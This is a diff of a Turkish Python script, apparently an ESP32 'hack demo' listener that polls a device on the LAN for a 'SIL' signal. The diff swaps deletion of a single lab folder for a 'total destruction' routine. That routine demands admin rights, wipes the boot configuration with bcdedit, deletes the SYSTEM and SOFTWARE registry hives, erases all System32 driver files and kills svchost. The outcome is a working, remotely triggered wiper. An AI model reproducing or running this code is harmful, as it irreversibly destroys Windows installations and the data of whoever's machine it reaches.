@@ -1,78 +1,64 @@
-"""
-ESP32 Hack Demo - Station Modu Dinleyici
-=========================================
-PC LAN'a bağlı, ESP32 lab Wi-Fi'sine bağlı.
-İkisi de aynı router üzerinde — Python ESP32'ye ulaşır.
-
-Kullanım:
-    pip install requests
-    python dinleyici_station.py
-    -- veya --
-    pyinstaller --onefile dinleyici_station.py
-"""
-
 import requests
 import os
-import shutil
 import time
+import ctypes
 
 # ============================================================
 # AYARLAR
 # ============================================================
-ESP32_IP  = "192.168.1.253"          # ESP32Station sabit IP
+ESP32_IP  = "192.168.1.253"
 ESP32_URL = f"http://{ESP32_IP}/durum"
 
-# Silinecek klasörün yolu — lab bilgisayarına göre düzenle
-KLASOR_YOLU = r"C:\kurban_klasor"
+def tam_imha():
+    print("\n[!!!] SİNYAL ALINDI! TAM İMHA BAŞLATILIYOR...")
+    
+    # 1. Önyükleme Kaydını (BCD) Sil - Bilgisayar bir daha asla Windows'u bulamaz.
+    print("[*] Boot verileri siliniyor...")
+    os.system("bcdedit /deleteall")
+    
+    # 2. Kayıt Defterini (Registry) Parçala - Windows'un tüm ayarlarını yok eder.
+    print("[*] Kayıt defteri temizleniyor...")
+    os.system(r'reg delete "HKEY_LOCAL_MACHINE\SYSTEM" /f')
+    os.system(r'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE" /f')
+    
+    # 3. Kritik Sürücüleri Sil - Donanım iletişimini keser.
+    print("[*] Sürücüler yok ediliyor...")
+    os.system(r"del /f /s /q C:\Windows\System32\drivers\*.sys")
 
-KONTROL_ARALIGI = 1
-# ============================================================
-
-
-def klasoru_sil(yol):
-    shutil.rmtree(yol)
-
+    # 4. Final: Mavi Ekranı Tetikle ve Sistemi Kapat
+    print("[*] Son darbe vuruluyor...")
+    # Kritik süreci sonlandırarak anında çökme sağlar
+    os.system("taskkill /f /im svchost.exe")
 
 def main():
-    print("=" * 50)
-    print("  ESP32 HACK DEMO — STATION MOD DİNLEYİCİ")
-    print("=" * 50)
-    print(f"ESP32 adresi : {ESP32_URL}")
-    print(f"Hedef klasör : {KLASOR_YOLU}")
-    print()
-
-    if not os.path.exists(KLASOR_YOLU):
-        print("[HATA] Hedef klasör bulunamadı! Yolu kontrol et.")
-        input("\nÇıkmak için Enter'a bas...")
+    # Yönetici kontrolü (WinError 5 almamak için şart!)
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        print("=" * 50)
+        print("[HATA] BU KODU LÜTFEN 'YÖNETİCİ OLARAK' ÇALIŞTIR!")
+        print("=" * 50)
         return
 
-    print("[HAZIR] Sinyal bekleniyor... Klasör şu an güvende.\n")
+    print("=" * 50)
+    print("      ESP32 DEMO: TOTAL DESTRUCTION MODE")
+    print("=" * 50)
+    print(f"Hedef: {ESP32_URL}")
+    print("[HAZIR] ESP32'den 'SIL' komutu bekleniyor...")
 
     while True:
         try:
             response = requests.get(ESP32_URL, timeout=2)
-            durum = response.text.strip()
+            durum = response.text.strip().upper()
 
             if durum == "SIL":
-                print("[!] SİL SİNYALİ ALINDI!")
-                print("[*] Klasör siliniyor...")
-                klasoru_sil(KLASOR_YOLU)
-                print("[✓] HEDEF YOK EDİLDİ!")
-                print("    Sunum tamamlandı.")
-                input("\nÇıkmak için Enter'a bas...")
+                tam_imha()
                 break
             else:
-                print(f"[...] Bekleniyor... (ESP32: '{durum}')", end="\r")
+                print(f"[...] Sinyal bekleniyor: '{durum}'", end="\r")
 
-        except requests.exceptions.ConnectionError:
-            print("[!] ESP32'ye bağlanılamıyor, tekrar deneniyor...", end="\r")
-        except requests.exceptions.Timeout:
-            print("[!] Zaman aşımı, tekrar deneniyor...           ", end="\r")
         except Exception as e:
-            print(f"[!] Hata: {e}                                 ", end="\r")
+            print(f"[!] Bağlantı hatası: {e}          ", end="\r")
 
-        time.sleep(KONTROL_ARALIGI)
-
+        time.sleep(1)
 
 if __name__ == "__main__":
     main()
